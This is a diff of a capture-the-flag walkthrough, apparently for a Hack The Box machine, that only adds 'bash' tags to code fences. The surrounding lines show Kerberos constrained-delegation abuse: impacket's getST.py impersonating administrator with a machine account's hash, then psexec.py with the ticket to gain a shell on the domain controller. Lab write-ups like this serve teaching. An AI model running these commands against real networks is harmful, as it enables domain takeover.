@@ -326,7 +326,7 @@ Let's go ahead and exploit this! :D
 
 We will first request the ticket using [**impacket**](https://github.com/SecureAuthCorp/impacket)'s `getST.py` script
 
-```
+```bash
 getST.py -dc-ip 10.10.10.248 -spn 'WWW/dc.intelligence.htb' -impersonate administrator intelligence.htb/'svc_int$' -hashes :6bf735e60852b92212d512a4deadcfea
 ```
 
@@ -334,7 +334,7 @@ getST.py -dc-ip 10.10.10.248 -spn 'WWW/dc.intelligence.htb' -impersonate adminis
 
 The ticket is now saved to disk. We're going to export it to our environment and use it to own the box:
 
-```
+```bash
 export KRB5CCNAME=<path/to/ticket>
 psexec.py -k -no-pass intelligence.htb/administrator@dc.intelligence.htb
 ```
